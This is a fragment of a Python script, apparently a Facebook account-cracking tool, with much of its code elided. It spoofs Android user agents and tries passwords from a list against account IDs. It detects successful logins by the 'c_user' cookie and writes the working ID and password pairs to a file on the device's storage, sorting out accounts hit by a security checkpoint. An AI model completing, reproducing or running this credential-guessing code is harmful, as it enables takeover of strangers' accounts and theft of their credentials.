...
ugen=[]
useragent=[]
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Hi9Pro Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022120648"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)"}
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/hashim•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
